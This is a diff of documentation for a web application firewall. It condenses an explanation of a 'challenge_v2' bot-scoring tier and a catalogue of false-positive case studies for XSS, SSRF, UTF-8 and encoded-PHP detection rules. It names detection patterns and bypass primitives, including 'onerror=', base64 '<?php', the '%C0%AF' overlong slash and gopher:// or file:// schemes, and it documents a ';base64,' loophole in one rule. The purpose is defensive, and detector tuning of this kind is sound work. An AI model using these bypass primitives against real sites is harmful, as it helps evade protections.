@@ -30,112 +30,63 @@ disabled (0) < logonly (1) < challenge (2) < challenge_v2 (3) < block (4)
 
 `_M.check` collects every match into a `hits` array and returns the strongest action. A `block` hit short-circuits later detectors (block is the cap; a `challenge_v2` hit does **not** short-circuit). Rule order no longer affects enforcement.
 
-### The `challenge_v2` tier (arm-surfaces slice C, 2026-09-22)
+### The `challenge_v2` tier
 
-`challenge_v2` is a challenge-tier mode with verify-time teeth. At the edge it
-serves the **same** challenge page as `challenge`; the difference is that the
-`ip_push` carries the verbatim `challenge_v2`, the daemon records a
-**per-IP** rung mark, and a solve from that IP failing the passive humanity
-score earns **no clearance** (`result=v2_reject`, retry-able — see
-`challenge_v2.go` D5), unless the client moved a pointer, no certain tell
-fired (webdriver / headless UA) and it has a score of at most 100, not counting linux_sw's share (so at most 120 for a desktop Linux solve): real input
-rescues it, `v2_rescued=input`. A higher failing score is never rescued (the
-cap, since 2026-10-20). The mark is per IP because the pushed decision is:
-cfm.lua serves that challenge on every web host the IP visits, so the rung
-covers every web host too. Until 2026-09-29 it was per (ip,host), and a client
-could solve the same challenge on a sibling vhost at v1 and keep the
-clearance. It is read for web-scope verifies only; the panel ports' own
-human-entry challenge is not armed by it. A passing web solve releases the
-IP's decision on every host (as before); a panel-port solve releases nothing,
-so it cannot lift a WAF challenge the web edge set. The scope comes from
-`X-CFM-Panel-Port` / `X-Forwarded-Port`: the panel listeners stamp them and
-the web `/__cfm_verify` locations clear them, so a client cannot claim a panel
-scope on the web listener (`TestVerifyLocations_*` pins both). A WAF mark also withholds
-the good-bot waiver on every web host of the IP for its 15 minutes (a WAF
-challenge never softens for bots), and it arms every web solve from that IP
-in that window — also one that answers a challenge the WAF did not impose —
-so `v2=mark` beside `src=vhost:…` is expected. The legacy `/verify` alias is
-gone (it bypassed the verify location's header clears). Semantics to know:
+A challenge-tier mode with teeth at verify time. The edge serves the **same**
+challenge page as `challenge`; the `ip_push` carries the verbatim
+`challenge_v2`, and the daemon records a **per-IP** rung mark (15 min,
+`challengeV2MarkTTL`). A solve from that IP is scored for passive headless
+evidence (`challenge_v2.go` D5), and a failing score earns **no clearance**
+(`result=v2_reject`, retry-able). **Real-input rescue:** a failing solve with
+pointer input, no certain tell (webdriver / headless UA) and a score of at
+most 100, not counting linux_sw's share (so at most 120 for a desktop Linux
+solve), passes as `result=solved` with `v2_rescued=input`; a higher score is
+never rescued.
 
-- **Set per rule** in `cfm_waf_config.lua` (see "Setting a rule's mode"
-  below; `return { rule_<name> = "challenge_v2" }`). Since **2026-09-23 the entire
-  challenge tier ships at `challenge_v2`** — every rule whose built-in default
-  was `challenge` now defaults to `challenge_v2` (`rule_xss` (302) led on
-  2026-09-22). The rationale is uniform: a v1 challenge is a paper wall against
-  a JS-capable bot (it solves the PoW and passes), while v2 scores the solve for
-  headless evidence at verify and costs a real human nothing (absence never
-  convicts). **`rule_long_path_segment` (102) was the one rule held at plain
-  `challenge` until 2026-11-14**, for a rendering search crawler (Googlebot
-  runs JS, follows long URLs) that v2 would wrongly reject, since a WAF-rule
-  mark is not good-bot-waived. That crawler never reaches the WAF: the bypass
-  list (`challenge_waf_bypass.conf`, Google's and Bing's crawler ranges among
-  others) skips it at `cfm.lua` Step 0, and a crawler a vhost lockdown holds
-  skips the inline WAF too. The 7-day fleet read before the move: 11 854 hits on
-  4 nodes, none from a crawler range (the 28 Google-ASN hits were
-  `*.bc.googleusercontent.com`, i.e. Google Cloud customers); 11 757 were
-  Amazonbot looping on one Joomla K2 feed URL; it was already challenged at
-  v1, and v2 changes only what a solve earns. A crawler OUTSIDE the bypass list that renders JS (PetalBot,
-  YouBot hit it too) can now be rejected; its long-URL hit was challenged at v1
-  already. The length heuristic is still FP-prone (FP case 1): narrow it, do
-  not move it back down.
-  (`rule_bad_ua` (201) IS in the sweep: a JS-capable headless browser
-  hiding behind an empty/library UA solves a v1 challenge and passes, and v2
-  scores it; a real user's UA never trips the scored tier and a non-JS script
-  never solves, so there is no added FP, and score ≥ 99 still hard-blocks.)
-  Revert any rule per fleet with `rule_<name> = "challenge"` in
-  `cfm_waf_config.lua`; watch `detection_history type=challenge_v2_reject` for a
-  rule that rejects legitimate solvers.
-- On the wire and in the bridge the decision stays plain `challenge` (edge
-  vocabulary); autoblock (`waf_security`) is untouched — it feeds on
-  `action=block` pushes only, and a `challenge_v2` push is not one.
-- **One push per IP and family per minute, on any host** (`should_push`), as
-  for every tier. The mark is per IP, so the first push covers every web host
-  of the IP. A scanner that trips the same v2 rule on several vhosts within
-  the 60 s window leaves one `cfm.waf.log` record and one `waf_trigger` row.
-  From 2026-09-23 until the mark became per IP, the key also carried the
-  Host (one push per vhost, capped by `push_v2_host_cap` = 16); both are gone.
-- **Reading it in the logs.** `cfm.waf.log` carries the verbatim
-  `"action":"challenge_v2"` (the hit), and the matching solve in
-  `cfm.challenges.log` carries `hs=<score>` plus `v2=mark` — the rung mark is
-  what proves the tier reached verify. (The solve line names ONE grain, the
-  highest-precedence arm covering it: `fp` > `geo` > `vhost` > `mark`. So on a
-  host that also carries a v2-tier vhost challenge, or for a client under an
-  armed fingerprint/geo policy, the very same WAF-marked solve reads `v2=vhost`
-  / `v2=fp` / `v2=geo` — the teeth are identical, only the label differs.)
-  `v2=` absent entirely on a solve that followed a `challenge_v2` hit means
-  either the rung is off or the mark was missing. Check in this order. **First,
-  `CHALLENGE_V2_PASSIVE`** — with the rung disabled the whole suffix is
-  suppressed, so if the line carries no `hs=` either, stop: nothing else is
-  wrong. If `hs=` IS there the rung is on and the mark is what is missing;
-  three causes, cheapest first: a panel-scope verify (`:2083`/`:2087`/`:2096`
-  — the WAF mark is web-scope only, by design); a solve later than
-  `challengeV2MarkTTL` (15m); or the per-IP WAF mark store hitting its cap and
-  failing open — that one is silent except for a single `[challenge_v2]
-  per-IP WAF mark store full` line in the daemon log per episode, and a storm
-  is exactly when it happens, so grep for it before concluding the push was
-  wrong. `hs=0` is a PASS: the score is positive-evidence-only, so 0 means
-  "no headless tell fired", not "humanity proved" — a real browser is expected
-  to score 0 and keep its clearance. A bite logs `result=v2_reject`; a failing
-  solve (a score of at most 100, not counting linux_sw's share (so at most 120 for a desktop Linux solve)) let through because the client moved a pointer
-  logs `result=solved`
-  with its failing `hs=`/`tells=` and `v2=mark v2_rescued=input` (kill switch
-  `CHALLENGE_V2_INPUT_RESCUE`).
-- Post-clearance conversion treats it exactly like `challenge` (cleared
-  clients are never re-challenged on either rung).
-- The panel-port gate (`cfm_panel.lua`) enforces block-tier hits only, so a
-  `challenge_v2` rule stays observe-only on `:2083/:2087/:2096`.
-- TTL: the default (challenge) TTL, not the block TTL.
-- `CHALLENGE_V2_PASSIVE=0` (`[webdetector]`) is the kill switch for the
-  verify-time teeth; the edge then behaves as plain `challenge`.
-- **Version skew warning:** on a CFM older than 2026-09-22 the Lua
-  `rule_mode()` treats `challenge_v2` as an unknown value and maps it to
-  `disabled` — setting the tier in `cfm_waf_config.lua` before upgrading
-  **silently turns the rule off** on that edge. The reverse skew (new Lua
-  loaded before the daemon restarts mid-upgrade) is transient: the old daemon
-  rejects the `challenge_v2` push, so the hit is served as a challenge but
-  leaves no mark/log/history until the daemon comes back new. Upgrade first,
-  then set the tier (the Lua and the daemon ship in the same package, so a
-  normal upgrade moves both together).
+The mark is per IP because the pushed decision is: cfm.lua serves the
+challenge on every web host the IP visits. For its 15 minutes it withholds the
+good-bot waiver on every web host of the IP and arms every web solve from it,
+also one answering a challenge the WAF did not impose (`v2=mark` beside
+`src=vhost:…` is expected). It is read for **web-scope** verifies only: a
+panel-port solve releases nothing, a passing web solve releases the IP on
+every host. The scope comes from `X-CFM-Panel-Port` / `X-Forwarded-Port`,
+stamped by the panel listeners and cleared by the web `/__cfm_verify`
+locations (`TestVerifyLocations_*`).
+
+- **Set or revert per rule** in `cfm_waf_config.lua`, on the edge's
+  `lua_package_path` (see "Promoting a rule"): `rule_<name> = "challenge_v2"`,
+  or `"challenge"` to step one rule back. The whole challenge tier ships at
+  `challenge_v2`: a v1 challenge is a paper wall to a JS-capable bot, and v2
+  costs a real human nothing (absence never convicts). That includes 102
+  (bypass-list crawlers never reach the WAF; FP case 1: narrow the rule, do
+  not move it back down) and 201 (score ≥ 99 still hard-blocks). Watch
+  `detection_history type=challenge_v2_reject` for a rule that rejects
+  legitimate solvers.
+- **Wire and autoblock.** The bridge decision stays plain `challenge`.
+  `waf_security` feeds on `action=block` only, so this tier never bans. One
+  push per IP and family per minute (`should_push`) covers every web host.
+- **Reading the logs.** `cfm.waf.log` has `"action":"challenge_v2"`; the solve
+  in `cfm.challenges.log` has `hs=<score>` and `v2=mark`. One grain is named,
+  by precedence `fp` > `geo` > `vhost` > `mark`, so the same solve can read
+  `v2=vhost` / `v2=fp` / `v2=geo` with identical teeth. `hs=0` is a **pass**
+  (no tell fired), not "humanity proved".
+- **`v2=` absent after a `challenge_v2` hit — check in this order.** First
+  `CHALLENGE_V2_PASSIVE`: with the rung off there is no `hs=` either, and
+  nothing else is wrong. With `hs=` present the mark is missing: a panel-scope
+  verify (`:2083`/`:2087`/`:2096`, by design); a solve after the 15 min TTL; or
+  the mark store hit its cap and failed open, silent except for one
+  `[challenge_v2] per-IP WAF mark store full` daemon log line per episode. It
+  happens in storms: grep for it before blaming the push.
+- **Kill switches** (`[webdetector]`): `CHALLENGE_V2_PASSIVE=0` (the edge then
+  behaves as plain `challenge`), `CHALLENGE_V2_INPUT_RESCUE=0`.
+- Post-clearance conversion treats it as `challenge`; TTL is the challenge
+  TTL. The panel-port gate (`cfm_panel.lua`) enforces block only, so a
+  `challenge_v2` rule is observe-only on `:2083/:2087/:2096`.
+- **Version skew.** A CFM older than 2026-09-22 maps `challenge_v2` to
+  `disabled`: setting it before upgrading **silently turns the rule off**. New
+  Lua with an old daemon (mid-upgrade) challenges but leaves no mark or log.
+  Upgrade first, then set the tier.
+
 
 Return shape: `(hit, reason, ttl, action, hits, waf_rule_id)`. The first four are the original API; `hits` is per-rule diagnostics; `waf_rule_id` is the strongest rule's stable numeric ID (see [Rule IDs](#rule-ids) below).
 
@@ -278,328 +229,159 @@ grep '"host":"example.com"' /var/log/cfm/cfm.waf.log | jq
 
 ## False-positive case studies
 
-A live record of FP shapes seen in production, what surfaced them, the
-structural mistake the original rule made, and the fix. Treat this as
-the **anti-pattern catalogue for new detectors** — every one of these
-shipped through the existing tests and the rollout playbook, and was
-only caught by reviewing real traffic. Add to this list when a new FP
-shape surfaces and a rule is changed to suppress it.
+FP shapes seen in production: what the legitimate request looked like, why
+the rule tripped, what shipped, and the lesson. This is the **anti-pattern
+catalogue for new detectors**: every case passed the tests and the rollout
+playbook and was caught only by reading real traffic. Add a case when a new
+FP shape changes a rule.
 
 ### Catching methodology (what the repeats look like)
 
-The pattern that keeps working:
-
 1. **Collect a representative window** (a few days, all servers) of raw
    `cfm.waf.log` JSON. The forensic fields (`ua`, `referer`, `ct`,
-   `asn_name`, `country`) are what let you tell "scraper using
-   residential proxy" from "real user on Greek ISP". The fleet-history
-   API endpoint strips those fields and truncates per agent — useful for
-   dashboards, not for FP hunting.
-2. **Aggregate by `(reason, host, ASN, UA family)`**. Anything where
-   one (host, ASN) combination dominates a single rule's hits is a
-   candidate. Anything from a residential ISP in your home country
-   (we use Greek ASNs as the litmus) with a modern realistic UA is a
-   stronger candidate.
-3. **Read the URI and Content-Type**. Look for:
+   `asn_name`, `country`) tell "scraper on a residential proxy" from "real
+   user on a Greek ISP". The fleet-history API strips them and truncates per
+   agent: fine for dashboards, not for FP hunting.
+2. **Aggregate by `(reason, host, ASN, UA family)`.** One (host, ASN) pair
+   dominating a rule's hits is a candidate. A residential ISP in the home
+   country (Greek ASNs are our litmus) with a modern UA is a stronger one.
+3. **Read the URI and Content-Type.** Look for:
     - `data:` URIs or `;base64,` in the path (template artifacts)
     - `/wp-admin/` paths (admin tooling)
-    - WordPress REST API paths (`/wp-json/…`)
-    - `multipart/form-data` content type (binary file uploads)
-    - `application/x-www-form-urlencoded` without `charset=UTF-8`
-      (legacy ISO-8859-x / windows-125x form posts)
-    - Bare-IP `host` headers
-4. **Replay the patched detector against the original log**. A short
-   harness reading `cfm.waf.log` and re-running the rule's Lua logic
-   against the captured URI + body tells you the before/after FP count
-   without waiting for a production window. Examples of this harness
-   live in the test plans of PR #912 and PR #969.
-5. **Stage the fix at the rule's current mode**, never tighter. If the
-   rule was `logonly`, fix and re-soak at `logonly`. Promotion is a
+    - WordPress REST paths (`/wp-json/…`)
+    - `multipart/form-data` (binary file uploads)
+    - `application/x-www-form-urlencoded` without `charset=UTF-8` (legacy
+      ISO-8859-x / windows-125x form posts)
+    - bare-IP `host` headers
+4. **Replay the patched detector against the original log.** A short harness
+   re-running the rule's Lua over the captured URI + body gives the
+   before/after FP count without waiting for a production window (examples in
+   the test plans of PR #912 and PR #969).
+5. **Stage the fix at the rule's current mode**, never tighter. Promotion is a
    separate decision gated on `cfm webtop waf hit-rates`.
 
 ### FP case 1 — `WAF_LONG_PATH` on `data:` URI / base64 template artifacts
 
-**Shape:** 84 events in a 4-day window, dominated by 52 hits on
-`mobian.eu` and 11 on `www.ezbeauty.gr`, all from AS32934 Facebook IPs.
-Path looked like `/data:text/javascript,setTimeout(function () { … }`
-or `/templates/.../slick_carousel/assets/css/data:image/svg+xml;base64,…`.
-Same trigger on `tehni.eu/claim-requests/image/jpeg;base64,…` from a
-single Greek OTEnet user over a working session (10 hits).
+**Shape:** 84 hits in 4 days, mostly AS32934 (Facebook) on two sites. Paths
+like `/data:text/javascript,setTimeout(…` and
+`/templates/…/css/data:image/svg+xml;base64,…`, plus `image/jpeg;base64,…`
+from one Greek user's session.
 
-**Root cause:** Bricks Builder (WP) injects inline scripts as
-`<script src="data:text/javascript,…">`. Facebook's
-`facebookexternalhit` OG-preview crawler dereferences the `src` as if
-it were a relative URL. The SP Page Builder Joomla template emits an
-unquoted `url(data:image/svg+xml;base64,…)` in a CSS rule, so the
-browser resolves it relative to the stylesheet. A broken `<img>` tag
-puts `image/jpeg;base64,…` directly into the path. None of those bytes
-were ever produced by an attacker — they're template emissions
-followed as URLs.
+**Why it tripped:** template output followed as a URL. Bricks Builder emits
+`<script src="data:text/javascript,…">`, which `facebookexternalhit`
+dereferences as a relative URL; SP Page Builder emits an unquoted
+`url(data:…;base64,…)` in CSS; a broken `<img>` puts base64 in the path. The
+rule ("one path segment ≥ 800 bytes = stuffed payload") had no notion of a
+template artifact.
 
-**Why we missed it:** the rule was designed for "single URL path
-segment ≥ 800 bytes = base64-stuffed scanner payload". The threshold
-was correct; the path classifier had no concept of "this segment is a
-template artifact, not a payload".
+**Fix (PR #912):** `detect_long_path_segment` skips when the path contains
+`;base64,` or `data:<type>/<subtype>[,;]` anywhere. Path-wide, because base64
+contains `/` and splits into many segments. Loophole, accepted: prefixing
+`;base64,` suppresses **only** this rule; RCE, traversal, SQLi and the base64
+scorer still read the content. 84 → 3 (all 3 real).
 
-**Fix:** in `detect_long_path_segment` skip the rule entirely when the
-path contains `;base64,` (anywhere) or `data:<type>/<subtype>[,;]`.
-Path-wide check, not per-segment, because base64 payloads contain `/`
-and the segmenter splits them into many short segments followed by one
-extremely long trailing chunk. Documented loophole: an attacker who
-prepends `;base64,` to a long payload suppresses **only** this rule —
-RCE, traversal, SQLi, and the base64 obfuscation scorer still inspect
-the content. Shipped in **PR #912**. Effect: 84 → 3 (all 3 real).
-
-**Lesson for new path-based rules:** before any length-based or
-substring-based path check, ask "what artifacts can a CMS template
-inject into the rendered HTML that a crawler might follow as a URL?"
-Inline `data:` URIs, inline `srcset=` strings, and unquoted `url(…)`
-in CSS are the three most common.
+**Lesson:** before a length or substring rule on the path, ask what a CMS
+template can put in HTML that a crawler follows as a URL: inline `data:` URIs,
+`srcset=` strings, unquoted `url(…)` in CSS.
 
 ### FP case 2 — `WAF_XSS` matching `onerror=` inside `creationError=`
 
-**Shape:** 1 event, but on `/wp-admin/edit.php` of `new.sikia-apartments.gr`
-from a real Greek OTEnet IP (109.178.22.113) — a WordPress admin
-working with WPML's Advanced Translation Editor. URL:
-`/wp-admin/edit.php?post_type=appartments&lang=en&referer=ate&wpml_version=4.9.3&ateJobCreationError=101&jobId=63`.
+**Shape:** a WordPress admin using WPML's translation editor:
+`/wp-admin/edit.php?…&ateJobCreationError=101&jobId=63`.
 
-**Root cause:** `detect_xss` used `string.find(s, "onerror=", 1, true)`
-— a plain substring search. The literal bytes `onerror=` appear inside
-`creationError=` (`…creati**onerror**=…`), so the substring matches
-even though no real XSS attribute is present. The detector had no
-concept of HTML attribute syntax — every `on*=` token in an HTML
-attribute must be preceded by a delimiter (space, quote, `<`, `;`,
-`/`), but the substring check didn't enforce that.
+**Why it tripped:** `detect_xss` used a plain substring find for `onerror=`,
+which sits inside `creati`**`onerror=`**. A real event-handler attribute is
+preceded by a delimiter; the tests only used payloads that had one.
 
-**Why we missed it:** plain-substring matching was chosen for speed,
-and the unit tests for `detect_xss` used realistic XSS payloads which
-all started with a delimiter. No test exercised the "keyword embedded
-in a longer identifier" case.
+**Fix (PR #912):** anchor each handler on a word boundary (`%f[%w]`), keeping
+the cheap plain `has()` precheck so clean requests pay no pattern cost.
 
-**Fix:** anchor each event-handler check on a non-word boundary using
-the Lua frontier pattern `%f[%w]`. Kept the cheap plain `has()`
-precheck so non-XSS requests pay zero pattern-engine cost. Shipped in
-**PR #912**. Effect: 7 WAF_XSS events → 6 (the 6 remaining are real
-attacks, the one cleared was the WPML FP).
-
-**Lesson for new substring-based rules:** if the substring you're
-matching is an English word or a code-token that could legitimately
-appear inside a longer identifier, anchor on a word boundary.
-`onerror=`, `onload=`, `eval(`, `system(` are the obvious traps;
-others surface when you actually look.
+**Lesson:** a token that is an English word or code fragment (`onerror=`,
+`onload=`, `eval(`, `system(`) needs a word-boundary anchor, and a test with
+the token inside a longer identifier.
 
 ### FP case 3 — `WAF_BAD_UTF8` on legitimate non-UTF-8 traffic
 
-**Shape:** 772 events in 4 days across titan + rigel. Almost entirely
-on Greek WordPress shops. Top URI paths:
+**Shape:** 772 hits in 4 days, all Greek residential users on Greek WordPress
+shops: media uploads, post saves, plugin installs, a Facebook ad landing page.
 
-```
-377  POST /wp-admin/async-upload.php                ← media library uploads
-135  POST /wp-admin/admin-ajax.php                  ← Greek post saves, plugin AJAX
- 83  POST /wp-admin/post.php                        ← Greek post editor saves
- 59  POST /flexboard/controller.php
- 47  POST /landing-mama-ypnos/                      ← Facebook ad landing page
-  9  POST /wp-admin/update.php                      ← plugin/theme installer
-  7  POST /wp-json/contact-form-7/.../feedback
-```
+**Why it tripped:** a port of Coraza's `validateUtf8Encoding`, but over the
+whole args+body with all six tags (Coraza scopes it to `ARGS_NAMES` /
+`ARGS_VALUES`). Legit traffic is not UTF-8: multipart bodies carry binary
+files; pre-charset themes post ISO-8859-7 (`%D0` = "Π" reads as a lead byte
+with no continuation); `facebookexternalhit` truncates URLs mid-escape.
 
-By Content-Type: 236 `application/x-www-form-urlencoded[; charset=UTF-8]`,
-59 empty, 15 `multipart/form-data`. By source: 100% Greek-residential
-ASNs hitting Greek hosts.
+**Fix:** report only the bypass tags `UTF8_OVERLONG`, `UTF8_SURROGATE`,
+`UTF8_OUT_OF_RANGE` (plus `0xC0`/`0xC1` leads as overlong); PR #969, 772 → 0.
+Then skip the body walk on `multipart/form-data`: JPEG SOF markers
+(`0xFFC0`/`0xFFC1`) fired `UTF8_OVERLONG` on every product-photo save. URL,
+args and non-multipart text bodies are still walked (tests 77b/77c). **Rule
+611 now ships `disabled`:** a later 30-day review found 2 hits, both FP. The
+detector and tests 75-77c stay; re-enable with `rule_bad_utf8 =
+"challenge_v2"` (`disabled` skips the walk).
 
-**Root cause:** three legitimate non-UTF-8 input shapes that the
-strict Coraza-style walker flagged as BAD_LEAD / BAD_CONT / TRUNC:
-
-1. **Multipart bodies carry raw binary file content** (JPEG/PNG/ZIP/PDF
-   bytes). Never UTF-8 by design.
-2. **Form posts from pre-charset themes carry single-byte legacy
-   encodings.** A Greek "Π" sent as `%D0` (ISO-8859-7) decodes to byte
-   0xD0, which looks like a UTF-8 2-byte lead expecting a continuation
-   — the next byte is `&` (form separator), not 0x80–0xBF, so the
-   walker fires `UTF8_BAD_CONT`. Perfectly legitimate Greek form data.
-3. **URLs truncated mid-percent-encoded-UTF-8 by upstream
-   redirectors.** Facebook's `facebookexternalhit` crawler chops ad
-   landing-page URLs at character boundaries it thinks are safe; the
-   resulting URL ends with `%CE%B` (incomplete escape) which
-   double-decodes to a stray lead byte. 47 of the 772 events were this
-   shape — every one of them came from AS32934 Facebook.
-
-**Why we missed it:** the detector was a faithful port of Coraza's
-`validateUtf8Encoding` operator. Coraza ships the operator scoped to
-specific variables (`ARGS_NAMES`, `ARGS_VALUES`) for exactly this
-reason; we initially applied it to the combined args+body buffer with
-all six tags returning. The detector's own commit message flagged
-"acceptable at logonly" but underestimated how many legacy WP
-deployments still emit non-UTF-8 form data.
-
-**Fix:** the walker returns **only the three encoding-bypass-specific
-tags** — `UTF8_OVERLONG`, `UTF8_SURROGATE`, `UTF8_OUT_OF_RANGE`. The
-other three tags (BAD_LEAD / BAD_CONT / TRUNC) still drive the cursor
-forward internally but never fire as a trigger. RFC-3629-forbidden
-2-byte leads (`0xC0` / `0xC1`) followed by a valid continuation are
-caught explicitly as `UTF8_OVERLONG` since those leads can only
-produce overlong encodings of ASCII. Shipped in **PR #969**. Effect:
-772 → 0 FPs cleared, real-attack coverage preserved (replay against
-test cases for `%C0%AF` overlong-`/`, surrogate codepoints in UTF-8,
-and out-of-range codepoints all still fire).
-
-**Follow-up (2026-06-04):** PR #969 suppressed BAD_LEAD/BAD_CONT/TRUNC but
-the three *attack* tags still fired on multipart uploads — a binary file
-part is exactly the place where `0xC0`/`0xC1` + continuation pairs (JPEG
-SOF markers `0xFFC0`/`0xFFC1`) and `E0`/`F0` leads decoding to overlong /
-surrogate codepoints occur by chance. e-vafeiadis.gr logged
-`UTF8_OVERLONG` on **every** Greek-admin product-photo save. `detect_bad_utf8`
-now **skips the body walk entirely when Content-Type is
-`multipart/form-data`** — the encoding-bypass primitive (`%C0%AF` for `/`)
-lives in the URL/args, which are still walked, and non-multipart text bodies
-(urlencoded / JSON / XML) are still walked so the overlong-slash body bypass
-(test 77c) keeps firing. Test 77b now carries real `0xC0`-overlong bytes so
-it actually guards the skip.
-
-**Retired (2026-09-23):** even after the two carve-outs above, a fresh fleet
-review found rule 611 **FP-only** — 2 hits in 30 days, both false positives (a
-zort.me URL-shortener form), and zero true positives — so it now ships
-**`disabled` by default**. The detector and its regression tests (75–77c) are
-kept: they encode the FP lessons, and an operator can re-enable per fleet with
-`rule_bad_utf8 = "challenge_v2"` in `cfm_waf_config.lua`. `disabled` skips the
-per-request UTF-8 walk entirely.
-
-**Lesson for new encoding-validity rules:** "not UTF-8" is not the
-same as "attack". A web property that has been running long enough to
-accumulate legacy WP plugins, pre-charset forms, or file-upload
-endpoints will produce non-UTF-8 traffic on every benign request.
-Before shipping a UTF-8 / charset / encoding validator, enumerate
-exactly which malformations are encoding-bypass primitives (overlong,
-surrogate, out-of-range, RFC-3629-forbidden leads) and report only
-those. Generic "this string is not well-formed UTF-8" is a noise
-generator.
+**Lesson:** "not UTF-8" is not "attack". Report only bypass primitives
+(overlong, surrogate, out-of-range, RFC-3629-forbidden leads).
 
 ### FP case 4 — `WAF_SSRF:SSRF_FTP` on WP All Import admin pages
 
-**Shape:** 4 events, all from one real Greek admin (89.210.235.252,
-AS3329 Vodafone-panafon, Chrome 148) on `xml.e-vafeiadis.gr`. URLs
-like `/wp-admin/admin.php?page=pmxi-admin-manage&id=11&action=options`.
-The admin was managing their WP All Import imports.
+**Shape:** one Greek admin on
+`/wp-admin/admin.php?page=pmxi-admin-manage&id=11&action=options`.
 
-**Root cause:** WP All Import (and similar plugins — WPvivid,
-UpdraftPlus, BackWPup) legitimately store `ftp://` URLs as plugin
-configuration. The admin revisiting the settings page sends GET
-requests whose query strings (and form state) echo the saved FTP URL.
-`detect_ssrf_proto` saw `ftp://` in args and fired `SSRF_FTP`. The
-URL was plugin state, not an attacker-controlled fetch target.
+**Why it tripped:** WP All Import (and WPvivid, UpdraftPlus, BackWPup) store
+`ftp://` URLs as configuration, and the settings page echoes them back.
 
-**Why we missed it:** SSRF detection was based on "no benign form
-field should carry a `ftp://` value". That assumption held for most
-endpoints — but not for WordPress plugin admin pages where the field
-value is itself a stored configuration URL.
+**Fix (PR #969):** on `^/wp-admin/`, suppress the `SSRF_FTP` tag only. FILE,
+GOPHER, DICT, LDAP, TFTP, STRATUM, SFTP and the IP-obfuscation tags still
+fire there.
 
-**Fix:** in the rule call site, when `tag == "SSRF_FTP"` and `uri`
-matches `^/wp-admin/`, suppress that tag only. All other SSRF tags
-(FILE, GOPHER, DICT, LDAP, TFTP, STRATUM, SFTP, IP-obfuscation
-flavours) keep firing on /wp-admin/ because no benign WP plugin
-legitimately stores those schemes as state. Shipped in **PR #969**.
-Effect: 4 → 0.
-
-**Lesson for new SSRF/protocol-scheme rules:** before adding a scheme
-to the scanner list, search the top 200 WordPress plugins (and the
-analogous lists for Joomla, Drupal, Magento) for plugins that
-legitimately accept that scheme as a config value. `ftp://`,
-`sftp://`, and `s3://` are likely; `gopher://`, `dict://`, `file://`
-are very unlikely. The narrower the scheme's legitimate use, the
-safer the rule.
+**Lesson:** before adding a scheme, check whether top WordPress / Joomla /
+Drupal / Magento plugins store it as config. `ftp://`, `sftp://`, `s3://` are
+likely; `gopher://`, `dict://`, `file://` are not.
 
 ### FP case 5 — `WAF_PHP_ENCODED_OPENER` on WPCode snippet saves
 
-**Shape:** 4 events, two real Greek admins (193.92.137.123 and
-89.210.235.252, Chrome 148, Vodafone + Nova residential IPs). URLs:
-`/wp-admin/admin.php?page=wpcode-snippet-manager` and
-`/wp-admin/admin-ajax.php`. The admins were saving PHP snippets via
-the WPCode plugin's editor.
+**Shape:** two Greek admins saving PHP snippets in WPCode
+(`admin.php?page=wpcode-snippet-manager`, `admin-ajax.php`).
 
-**Root cause:** `detect_php_encoded_opener` looked for base64 / URL-
-encoded / HTML-entity / JS-escape forms of `<?php` in request bodies
-— an encoding bypass primitive for upload-vetting WAFs that look for
-literal `<?php`. (Audit **F16** later removed the URL / HTML-entity /
-JS-unicode forms as legit-content encodings, leaving base64 + JS `\x`
-hex-escape — but WPCode's own bodies are **base64**, so this case is
-unaffected by F16.) WPCode (and Code Snippets, Insert PHP Code Snippet,
-…) lets admins author PHP snippets through the WP admin UI. When the
-admin saves, the plugin POSTs the snippet body to admin-ajax.php; the
-plugin serialises the snippet contents in base64. The body literally
-contains `PD9waHA…` (base64 of `<?php …`), so the rule fires.
+**Why it tripped:** WPCode (and Code Snippets, Insert PHP Code Snippet)
+serialise the snippet in base64, so the body holds `PD9waHA…`, base64 of
+`<?php`. The rule looks for encoded openers as a smuggling signal.
 
-**Why we missed it:** the rule was designed to catch attackers
-smuggling PHP through endpoints that decode body data on the server
-side. The detector had no concept of "this body legitimately contains
-encoded PHP because the admin is authoring it".
+**Fix (PR #969, then audit F11):** 437 / 438 are suppressed on `/wp-admin/*`,
+where cookie auth gates the admin tooling. F11 found that assumption wrong
+for `admin-ajax.php` and `admin-post.php`: they serve `nopriv` actions
+pre-auth. The edge cannot tell a WPCode save from a nopriv attack (both are
+base64 `<?php`; the WP cookie is spoofable), so enforcing there would repeat
+this case. The split: 437 (JS `\x` hex) stays suppressed on all `/wp-admin/`;
+438 (base64) is **`logonly`** on those two pre-auth endpoints (a logonly hit
+never reaches autoblock, which ingests `action=block` only) and suppressed on
+the rest of `/wp-admin/`. Elsewhere 438 is `block` and armed. Watch rule 438
+on an admin-ajax URI to separate attacks from WPCode noise before any change.
 
-**Fix:** suppress the rule entirely on `/wp-admin/*` paths. WP
-cookie-auth has already gated those requests before they reach the
-WAF, so we don't try to second-guess admin tooling. Webshells
-delivered via theme/plugin file editors, upload exploits, or
-vulnerable public endpoints still arrive on non-/wp-admin/ paths
-where this rule remains active. Shipped in **PR #969**. Effect:
-4 → 0.
-
-**Refinement (audit F11):** the "cookie-auth has already gated it"
-assumption is *wrong* for `/wp-admin/admin-ajax.php` and
-`/wp-admin/admin-post.php` — both serve `wp_ajax_nopriv_*` /
-unauthenticated `admin-post` actions and are reachable PRE-auth, so a
-blanket suppression there is a pre-auth WAF blind spot for base64
-`<?php` smuggling. But the edge can't distinguish a legit WPCode save
-from a nopriv attack (both are base64 `<?php` on admin-ajax; the WP
-cookie is spoofable), so enforcing would just re-run this incident.
-The carve-out is therefore split: **437** (the JS `\x` hex-escape form
-after F16) stays fully suppressed on all `/wp-admin/`; **438** (base64) is kept **`logonly`**
-on the two pre-auth endpoints (detect-and-watch, zero enforcement — a
-`logonly` hit is dropped by the autoblock feed, which ingests only
-`action=block`, and the family's only block-tier rule, 440, keys on a plugin
-PHP file's command call, never on a body like this, so no ban even though the
-family is autoblock-armed) and stays suppressed
-on the rest of `/wp-admin/` (authed editors). Watch the logonly stream
-(rule 438 on an admin-ajax URI) to separate real attacks from WPCode
-noise before considering any promotion.
-
-**Lesson for new body-content rules:** any rule that scans POST bodies
-for code-shaped strings (PHP openers, SQL keywords, JS function
-calls) needs an answer for "what legitimate admin tooling writes this
-shape of content?" before going to production. WP admin (`/wp-admin/`),
-phpMyAdmin, Adminer, Joomla administrator, cPanel file manager,
-DirectAdmin, and the various theme/plugin code editors are the usual
-suspects.
+**Lesson:** a body rule for code shapes (PHP openers, SQL keywords, JS calls)
+needs an answer for "which admin tooling writes this?": `/wp-admin/`,
+phpMyAdmin, Adminer, Joomla administrator, cPanel File Manager, DirectAdmin,
+theme/plugin editors.
 
